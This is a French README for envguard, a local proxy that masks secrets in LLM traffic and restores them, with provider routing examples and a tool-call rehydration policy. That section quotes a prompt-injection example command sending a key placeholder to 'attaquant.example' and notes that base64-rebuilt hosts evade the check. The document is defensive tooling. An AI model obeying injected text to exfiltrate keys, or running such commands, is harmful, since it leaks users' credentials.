# envguard

Proxy local qui **masque les clés API et secrets** avant qu'ils n'atteignent un LLM, puis **les remet** dans la réponse. Le modèle ne voit jamais la vraie valeur, mais tes outils (et tes tool calls) la reçoivent.

```
client ──▶ envguard ──▶ API du fournisseur
   sk-ant-api03-Xy…   →   sk-ant-REDACTED_3c93161e
   sk-ant-api03-Xy…   ◀   sk-ant-REDACTED_3c93161e
```

- Détection native rapide (préfixes connus, JWT, clés PEM, mots de passe d'URL, `API_KEY=…`, marquage `# secret:`) plus **~210 règles gitleaks**
- **Valeurs de vos fichiers `.env`** masquées partout, même sans motif reconnaissable
- **Politique de réhydratation** : une clé n'est remise dans un appel d'outil que vers une destination légitime (bloque l'exfiltration par injection de prompt)
- Placeholders stables : même secret → même placeholder, ce qui préserve le prompt caching
- Streaming géré (placeholders coupés entre deux chunks), y compris les arguments de tool calls
- Formats : Anthropic Messages, OpenAI Chat Completions, OpenAI Responses, Gemini natif
- TUI Bubble Tea, mode headless, ou `envguard run -- <outil>`

## Démarrage rapide

```bash
go build -o envguard .
```

```bash
./envguard run -- claude
```

`envguard run` lance le proxy sur un port libre, démarre l'outil avec `ANTHROPIC_BASE_URL`, `OPENAI_BASE_URL`, `OPENAI_API_BASE` et `GOOGLE_GEMINI_BASE_URL` pointés vers lui, et s'arrête avec lui. Ça marche de la même façon avec `codex`, `gemini`, `aider`…

- **Pas d'interface :** l'outil occupe le terminal. Le journal va dans `<config>/envguard/run.log` (`-log`), sans jamais écrire de secret, et un résumé s'affiche à la sortie, réhydratations bloquées comprises.
- **URL de base déjà définie** (passerelle d'entreprise, autre proxy) : envguard s'insère devant au lieu de l'écraser. Un `-provider` explicite reste prioritaire.
- **Signaux et code de sortie :** le code de sortie de l'outil est transmis. `Ctrl+C` va à l'outil, et `SIGTERM` / `SIGHUP` lui sont relayés.

Pour garder le proxy ouvert avec la TUI, sans outil attaché :

```bash
./envguard
```

Par défaut, il écoute sur `127.0.0.1:8787`. Toutes les options s'appliquent aussi à `envguard run` :

| Option | Défaut | Rôle |
|---|---|---|
| `-listen` | `127.0.0.1:8787` (`run` : port libre) | adresse d'écoute |
| `-provider nom=url` | — | ajoute ou surcharge un fournisseur (répétable) |
| `-env-file fichier` | les `.env*` du dossier courant | fichier `.env` dont les valeurs sont masquées (répétable) |
| `-no-env` | `false` | ne pas lire les `.env` du dossier courant |
| `-tool-policy` | `strict` | réhydratation dans les appels d'outils : `strict`, `warn` ou `off` |
| `-allow-host type=hôte` | — | destination autorisée pour un type de secret (répétable), ex. `env:API_TOKEN=api.exemple.com` |
| `-no-gitleaks` | `false` | désactiver les règles gitleaks |
| `-gitleaks-exclude id` | — | ignorer une règle gitleaks (répétable) |
| `-allow` | `~/.envguard_allow` | allowlist (envguard n'y écrit que des HMAC, jamais le secret en clair) |
| `-key` | `<config>/envguard/key` | clé qui dérive les placeholders (créée au premier lancement, `0600`) |
| `-allow-origin URL` | — | origine navigateur autorisée, ex. `http://localhost:3000` (répétable) |
| `-max-body` | `268435456` | taille max d'un corps de requête, en octets |
| `-log` | `<config>/envguard/run.log` | journal de `envguard run` |
| `-no-hint` | `false` | n'injecte pas la consigne « recopie les placeholders tels quels » |
| `-no-tui` | `false` | logs sur stderr au lieu de la TUI |

`<config>` est `~/Library/Application Support` sur macOS et `~/.config` sur Linux.

## Principe du routage

Chaque fournisseur a sa route : `http://127.0.0.1:8787/<nom>` remplace la base URL officielle, le reste du chemin est inchangé.

```
http://127.0.0.1:8787/groq/v1/chat/completions  →  https://api.groq.com/openai/v1/chat/completions
```

Ta clé du fournisseur (header `Authorization`, `x-api-key`, `x-goog-api-key`) est transmise telle quelle : seul le **contenu** des requêtes est masqué.

Dans les exemples ci-dessous, remplace `$MODEL` par le modèle voulu.

---

## Anthropic (Claude)

Claude Code :

```bash
ANTHROPIC_BASE_URL=http://127.0.0.1:8787/anthropic claude
```

SDK (Python / TypeScript) : `base_url="http://127.0.0.1:8787/anthropic"`.

```bash
curl http://127.0.0.1:8787/anthropic/v1/messages -H "x-api-key: $ANTHROPIC_API_KEY" -H "anthropic-version: 2023-06-01" -H "content-type: application/json" -d '{"model":"'$MODEL'","max_tokens":256,"messages":[{"role":"user","content":"ma clé: sk-ant-api03-exemple0123456789abcdefghij"}]}'
```

## OpenAI

Codex et SDK OpenAI :

```bash
OPENAI_BASE_URL=http://127.0.0.1:8787/openai/v1 codex
```

```bash
curl http://127.0.0.1:8787/openai/v1/chat/completions -H "Authorization: Bearer $OPENAI_API_KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","stream":true,"messages":[{"role":"user","content":"hello"}]}'
```

L'API Responses passe par la même route : `/openai/v1/responses`.

## Google Gemini

API native (Gemini CLI, SDK `google-genai`) :

```bash
GOOGLE_GEMINI_BASE_URL=http://127.0.0.1:8787/gemini gemini
```

```bash
curl "http://127.0.0.1:8787/gemini/v1beta/models/$MODEL:streamGenerateContent?alt=sse" -H "x-goog-api-key: $GEMINI_API_KEY" -H "content-type: application/json" -d '{"contents":[{"parts":[{"text":"hello"}]}]}'
```

Couche compatible OpenAI :

```bash
OPENAI_BASE_URL=http://127.0.0.1:8787/gemini/v1beta/openai OPENAI_API_KEY=$GEMINI_API_KEY codex
```

> Utilise `?alt=sse` pour le streaming natif. Sans ce paramètre, Gemini renvoie un tableau JSON, qui est réhydraté mais seulement une fois reçu en entier.

## DeepSeek

Format OpenAI :

```bash
curl http://127.0.0.1:8787/deepseek/chat/completions -H "Authorization: Bearer $DEEPSEEK_API_KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
```

Format Anthropic (Claude Code avec les modèles DeepSeek) :

```bash
ANTHROPIC_BASE_URL=http://127.0.0.1:8787/deepseek/anthropic ANTHROPIC_AUTH_TOKEN=$DEEPSEEK_API_KEY claude
```

## Meta (Muse Spark)

Chat Completions, Responses et Messages sont tous disponibles.

```bash
OPENAI_BASE_URL=http://127.0.0.1:8787/meta/v1 OPENAI_API_KEY=$MODEL_API_KEY codex
```

```bash
curl http://127.0.0.1:8787/meta/v1/chat/completions -H "Authorization: Bearer $MODEL_API_KEY" -H "content-type: application/json" -d '{"model":"muse-spark-1.1","messages":[{"role":"user","content":"hello"}]}'
```

## xAI (Grok)

```bash
curl http://127.0.0.1:8787/xai/v1/chat/completions -H "Authorization: Bearer $XAI_API_KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
```

## Mistral

```bash
curl http://127.0.0.1:8787/mistral/v1/chat/completions -H "Authorization: Bearer $MISTRAL_API_KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
```

## Groq

```bash
curl http://127.0.0.1:8787/groq/v1/chat/completions -H "Authorization: Bearer $GROQ_API_KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
```

## OpenRouter

```bash
OPENAI_BASE_URL=http://127.0.0.1:8787/openrouter/v1 OPENAI_API_KEY=$OPENROUTER_API_KEY codex
```

```bash
curl http://127.0.0.1:8787/openrouter/v1/chat/completions -H "Authorization: Bearer $OPENROUTER_API_KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
```

## Together AI

```bash
curl http://127.0.0.1:8787/together/v1/chat/completions -H "Authorization: Bearer $TOGETHER_API_KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
```

## Fireworks AI

```bash
curl http://127.0.0.1:8787/fireworks/v1/chat/completions -H "Authorization: Bearer $FIREWORKS_API_KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
```

## Qwen (Alibaba DashScope, international)

```bash
curl http://127.0.0.1:8787/qwen/v1/chat/completions -H "Authorization: Bearer $DASHSCOPE_API_KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
```

Région Chine : `-provider qwen=https://dashscope.aliyuncs.com/compatible-mode`.

## Moonshot (Kimi)

```bash
curl http://127.0.0.1:8787/moonshot/v1/chat/completions -H "Authorization: Bearer $MOONSHOT_API_KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
```

## Z.ai (GLM)

La base officielle contient déjà la version, la route n'a donc pas de `/v1` :

```bash
curl http://127.0.0.1:8787/zai/chat/completions -H "Authorization: Bearer $ZAI_API_KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
```

## Perplexity

```bash
curl http://127.0.0.1:8787/perplexity/chat/completions -H "Authorization: Bearer $PERPLEXITY_API_KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
```

## Cohere (compatibilité OpenAI)

```bash
curl http://127.0.0.1:8787/cohere/v1/chat/completions -H "Authorization: Bearer $COHERE_API_KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
```

## Ollama (local)

```bash
curl http://127.0.0.1:8787/ollama/v1/chat/completions -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
```

L'API native `/api/chat` d'Ollama n'est pas gérée en streaming : utilise `/v1`.

## Autre fournisseur compatible OpenAI

```bash
./envguard -provider monfournisseur=https://api.exemple.com
```

```bash
curl http://127.0.0.1:8787/monfournisseur/v1/chat/completions -H "Authorization: Bearer $KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
```

`-provider` surcharge aussi un fournisseur existant (URL régionale, passerelle d'entreprise…).

---

## Ce qui est détecté

| Type | Exemples |
|---|---|
| Clés à préfixe connu | `sk-ant-`, `sk-proj-`, `sk-svcacct-`, `sk-or-v1-`, `sk-`, `xai-`, `pplx-`, `AIza`, `gsk_`, `hf_`, `r8_`, `ghp_`/`gho_`/`ghs_`/`ghu_`/`ghr_`, `github_pat_`, `glpat-`, `glptt-`, `xoxb-`/`xoxp-`/`xoxa-`/`xoxr-`/`xoxs-`, `xapp-`, `AKIA`, `ASIA`, `sk_live_`, `rk_live_`, `sk_test_`, `whsec_`, `npm_`, `pypi-`, `dckr_pat_`, `shpat_`…, `dop_v1_`, `lin_api_`, `ntn_`, `SG.`, `hvs.`, `dp.pt.` |
| JWT | `eyJ….eyJ….signature` (trois segments) |
| Clés privées PEM | chaque ligne base64 entre `-----BEGIN … PRIVATE KEY-----` et `-----END` |
| Mots de passe dans les URL | `postgres://user:motdepasse@hôte` (pas les `${VARIABLE}`) |
| Jetons Bearer | `Authorization: Bearer <jeton>` sans préfixe connu |
| Assignations | `API_KEY=…`, `db_password: "…"`, `auth_header = …` (valeur ≥ 12 caractères et entropie élevée) |
| Marquage manuel | `host = "interne" # secret:` ou `# secret: valeur` (aussi avec `//`) |

Exclus automatiquement : hashes hexadécimaux (commits), UUID, nombres, certificats publics, variables (`${…}`), placeholders déjà masqués. Pour un faux positif : touche `a` dans l'onglet Secrets de la TUI.

## Fichiers `.env`

Au démarrage, envguard lit les fichiers `.env`, `.env.local`, `.env.production`, `.envrc`… du dossier courant (ou ceux passés par `-env-file`) et les surveille. Chaque valeur qui ressemble à un secret est enregistrée telle quelle : elle est ensuite masquée **partout** où elle apparaît, même dans du texte où rien ne permettrait de la reconnaître.

Pour ne pas masquer des mots ordinaires, seules sont retenues :
- les variables au nom évocateur (`KEY`, `SECRET`, `TOKEN`, `PASSW`, `AUTH`…) ;
- les valeurs reconnues par une règle ;
- les valeurs longues à forte entropie.

Sont ignorés : les fichiers d'exemple (`.env.example`, `.env.sample`, `.env.template`…), les valeurs banales (`development`, `true`, `3000`, `localhost`…) et les chemins. Pour une URL (`DATABASE_URL=postgres://user:mdp@hôte/db`), seul le mot de passe est masqué, et son hôte devient sa destination légitime.

## Politique de réhydratation des appels d'outils

Le modèle ne connaît pas la valeur d'un secret, mais il connaît son placeholder. Une injection de prompt (page web lue, fichier piégé…) peut lui faire écrire `curl https://attaquant.example/?k=sk-ant-REDACTED_…`. Une réhydratation aveugle enverrait alors le vrai secret à l'attaquant.

Dans les **arguments d'un appel d'outil**, quel que soit le format (`tool_use` Anthropic, `tool_calls` OpenAI, `function_call` Responses, `functionCall` Gemini), un placeholder n'est remis que si **chaque hôte réseau cité dans l'appel** est une destination légitime pour ce secret :

| Secret | Destinations légitimes |
|---|---|
| Clé à préfixe connu | le fournisseur (`sk-ant-` → `anthropic.com`, `ghp_` → `github.com`, `AKIA` → `amazonaws.com`…) |
| Mot de passe d'URL | l'hôte de l'URL d'origine |
| Tout secret | les hôtes ajoutés par `-allow-host type=hôte` |
| Appel sans destination visible | toujours autorisé (`DB_PASSWORD=… npm test`) |

Sinon, le placeholder reste tel quel : la commande échoue sans fuite, et la TUI (ou le résumé de `envguard run`) indique l'option à ajouter si l'appel était légitime.

```bash
./envguard run -allow-host env:API_TOKEN=api.mycompany.com -- claude
```

Le type d'un secret apparaît dans la TUI : `env:NOM`, `generic`, `url_password`, `gitleaks:<règle>`… La forme courte (`env`, `gitleaks`) et `*` sont acceptées. Le texte affiché à l'utilisateur est toujours réhydraté normalement.

- **Retenue en streaming :** dès qu'un placeholder apparaît dans des arguments, la suite de l'appel est retenue jusqu'à sa fin, car le domaine visé peut arriver après le placeholder.
- **Variantes base64 :** un placeholder encodé en base64 n'est jamais réhydraté dans un appel d'outil.
- **Limite :** c'est une défense contre les exfiltrations visibles. Une commande qui reconstruit l'hôte à l'exécution (`$(echo … | base64 -d)`) n'est pas détectable ici.

`-tool-policy warn` remet le secret mais signale l'appel ; `-tool-policy off` revient à l'ancien comportement.

## Règles gitleaks

Les règles du projet [gitleaks](https://github.com/gitleaks/gitleaks) (licence MIT, copie dans `third_party/gitleaks`) sont intégrées au binaire : environ 210 types de secrets en plus des règles natives.

- **Exclusions :** `generic-api-key`, `jwt` et `private-key` sont exclues. envguard a ses propres détecteurs pour ces trois cas, plus rapides et adaptés au JSON.
- **Garde-fou :** une valeur trouvée est masquée partout ensuite. On exige donc 10 caractères imprimables au moins, sans guillemet ni backslash, et une entropie minimale.
- **Écart avec gitleaks :** les mots-clés sont cherchés en début de mot, après un séparateur ou sur une transition camelCase.

Pour mettre les règles à jour :

```bash
cd third_party/gitleaks && curl -sfLo gitleaks.toml https://raw.githubusercontent.com/gitleaks/gitleaks/master/config/gitleaks.toml && python3 convert.py
```

## Sécurité

- **Requêtes de navigateur refusées** : un en-tête `Origin` ou `Sec-Fetch-Site: cross-site` donne un 403 (sauf `-allow-origin`). Un `Host` non local aussi, contre le DNS rebinding. Les en-têtes CORS de l'amont ne sont jamais relayés.
- **Corps compressés** : gzip et deflate sont décompressés avant masquage ; tout autre encodage est refusé (415), jamais relayé en aveugle.
- **Placeholders à clé** : HMAC-SHA256 avec une clé locale. Un placeholder ne permet pas de vérifier hors ligne un secret deviné.
- Analyse complète, risques restants et limites : [SECURITY.md](SECURITY.md).

## TUI

| Touche | Action |
|---|---|
| `tab` | basculer Activité / Secrets |
| `↑` `↓` / `j` `k` | naviguer dans les secrets |
| `a` | ajouter le secret sélectionné à l'allowlist |
| `p` / `espace` | mettre en pause le masquage |
| `q` | quitter |

## Limites

- Un placeholder que le modèle réécrit (casse changée, découpage, encodage autre que base64) n'est pas réhydraté.
- Un secret maison sans préfixe ni nom de variable explicite, absent des `.env`, passe à travers : utilise `# secret:` ou `-env-file`.
- La politique des outils bloque les exfiltrations visibles, pas une commande qui reconstruit l'hôte à l'exécution.
- Les API natives de Cohere (v2) et d'Ollama (`/api/chat`) ne sont pas gérées en streaming.

## Ce qui reste à faire

Par ordre d'intérêt :

1. **Valider sur une vraie session d'agent.** Les tests simulent les quatre formats de streaming, mais aucune session réelle de Claude Code ou Codex avec une clé d'API n'est encore passée par envguard. C'est la prochaine étape, avant toute nouvelle fonctionnalité : elle dira si la politique des outils bloque à tort des appels courants.
2. **Fichier de configuration** (`~/.config/envguard/config.toml`) : fournisseurs, `-allow-host`, `-env-file` et règles maison versionnés, au lieu d'une ligne de commande qui s'allonge.
3. **`envguard attach`** : afficher la TUI d'un `envguard run` en cours dans un second terminal, pour voir les masquages et les blocages en direct.
4. **Secrets pièges** : de faux secrets glissés dans le contexte. Si l'agent tente de s'en servir, c'est une injection de prompt, y compris dans les cas que la politique ne voit pas (hôte reconstruit à l'exécution).
5. **Documents encodés** : décoder les pièces jointes texte en base64 (bloc `document` d'Anthropic, fichiers OpenAI) avant le scan ; aujourd'hui, un `.env` joint ainsi n'est pas lu.
6. **Distribution** : intégration continue (tests, `-race`, fuzzing court), binaires signés via goreleaser, formule Homebrew. Le code compile déjà pour Linux et Windows, mais `envguard run` n'a été testé que sur macOS.
7. **Journal d'audit** JSONL sans aucun secret, et **mode blocage** (refuser une requête au lieu de masquer, pour les clés les plus sensibles).

La liste complète, classée par impact et effort, est dans la feuille de route.

## Tests

```bash
go test ./...
```

```bash
go test -race ./...
```

```bash
go test -run '^$' -fuzz FuzzSSE -fuzztime 60s .
```

```bash
go test -run x -bench . .
```
